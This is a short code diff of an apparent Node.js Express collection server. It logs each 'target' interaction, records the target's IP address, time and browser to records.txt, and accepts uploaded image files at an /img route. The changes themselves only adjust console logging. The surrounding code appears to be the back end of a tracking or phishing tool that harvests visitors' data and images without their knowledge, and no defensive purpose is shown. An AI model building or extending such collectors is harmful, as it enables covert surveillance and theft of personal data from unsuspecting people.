@@ -42,7 +42,7 @@ app.post('/', (req, res)=>{
     console.log("[!] Target interacted")
     console.log("[*] IP: " + req.body.ip);
     console.log("[*] Time: " +frmt + req.body.t);
-    console.log("[*] user: " + req.body.browser);
+    // console.log("[*] user: " + req.body.browser);
     // fs.appendFile('records.txt', frmt+"  ->  "+req.body.ip +"\n", (err)=>{
     fs.appendFile('records.txt', "Time: " + req.body.t+"\nIP: "+req.body.ip +"\nUser: " + req.body.browser + "\n\n\n", (err)=>{
     if(err) throw err;
@@ -57,7 +57,9 @@ app.post('/img', upload.single('file'), (req, res, next)=>{
     res.status(400).send('No file uploaded.');
     return;
   }
-//   console.log(req.file);
+  // console.log(req.file);
+  console.log(`[*] ${req.file.filename} ${req.file.size/1024}Kbs Reciveid Successfully!`)
+    //  console.log()
 //   res.send('File uploaded successfully.');
 });
 
